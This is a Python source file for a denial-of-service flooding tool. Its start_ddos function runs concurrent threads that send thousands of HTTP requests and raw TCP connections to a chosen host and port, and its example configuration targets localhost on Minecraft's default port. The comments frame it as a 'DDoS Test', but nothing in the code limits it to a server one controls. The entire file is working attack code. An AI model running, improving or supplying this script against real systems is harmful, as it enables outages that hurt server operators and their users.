import time
import concurrent.futures
import requests
import socket
from colorama import Fore, init


# Initialize colorama
init(autoreset=True)

# Function to send HTTP requests using requests library
def send_http_request(n, host, port, num_repeats=2000, packet_counter=None, response_list=None):
    print(f"Task {n} is starting HTTP requests.\n")
    
    try:
        for _ in range(int(num_repeats)):
            response = requests.get(f"http://{host}:{port}", headers={"User-Agent": "SOLAR BEAM"})
            packet_counter['count'] += 1  # Increment packet counter after each request
            
            # Store the response details
            status = "Success" if response.status_code == 200 else f"Failed (Status Code: {response.status_code})"
            response_list.append({"Task": n, "Type": "HTTP", "Status": status, "Code": response.status_code})
 
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Task {n}: HTTP request denied. Error: {str(e)}")
        response_list.append({"Task": n, "Type": "HTTP", "Status": "Failed", "Error": str(e)})

# Function to send TCP requests to a server (Minecraft testing)
def send_tcp_request(n, host, port, num_repeats=2000, packet_counter=None, response_list=None):
    print(f"Task {n} is starting TCP requests.\n")
    
    try:
        for _ in range(int(num_repeats)):
            # Create a socket and attempt to connect
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # Set timeout for connections

            # Attempt to connect to the Minecraft server or any TCP server
            sock.connect((host, int(port)))
            packet_counter['count'] += 1  # Increment packet counter after each request

            # Send a dummy message (this could be a valid handshake for Minecraft protocol if needed)
            request = b'GET / HTTP/1.1\r\nHost: ' + host.encode() + b'\r\n\r\n'  # Concatenate byte strings
            sock.sendall(request)  # Send the request
            
            # Close the connection after sending the request
            sock.close()

            # Store the response details
            response_list.append({"Task": n, "Type": "TCP", "Status": "Success", "Code": "N/A"})
            
    except socket.error as e:

        response_list.append({"Task": n, "Type": "TCP", "Status": "Failed", "Error": str(e)})

# Function to select traffic type (HTTP, TCP, or Both)
def start_ddos(ip, port, repeat, tasks, traffic_type="http"):
    packet_counter = {'count': 0}  # Initialize packet counter as a dictionary to pass by reference
    response_list = []  # List to store the response details
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=int(tasks)) as executor:
        futures = []
        
        # Start HTTP requests if the traffic type includes "http"
        if traffic_type in ["http", "both"]:
            futures.extend([executor.submit(send_http_request, i, ip, port, repeat, packet_counter, response_list) for i in range(int(tasks))])

        # Start TCP requests if the traffic type includes "tcp"
        if traffic_type in ["tcp", "both"]:
            futures.extend([executor.submit(send_tcp_request, i, ip, port, repeat, packet_counter, response_list) for i in range(int(tasks))])

        # Wait for each task to complete and handle results
        for future in concurrent.futures.as_completed(futures):
            future.result()

    # After all tasks are done, print total packets sent
    print(f"\nDDoS Test Complete. Total packets sent: {packet_counter['count']}")
    
    # Loop through the responses and print status messages
    for response in response_list:
        task = response["Task"]
        status = response["Status"]
        if "Failed" in status:
            print(f"{Fore.RED}Task {task}: Request failed")
        else:
            print(f"{Fore.GREEN}Task {task}: Request is successful")

    # Save the log messages to a file
    with open("ddos_log.log", "w") as log_file:
        log_file.write(f"Total packets sent: {packet_counter['count']}\n")
    print(f"\nLog saved")

# Example usage:
if __name__ == "__main__":
    ip = "127.0.0.1"  # Target IP (this should be the server's IP)
    port = 25565  # Target Port (Minecraft's default is 25565, or use any other TCP service port)
    repeat = 2000  # Number of times to send the request (for both HTTP and TCP)
    tasks = 10  # Number of concurrent tasks (threads)
    traffic_type = "both"  # Options: "http", "tcp", or "both"
    
    start_ddos(ip, port, repeat, tasks, traffic_type)
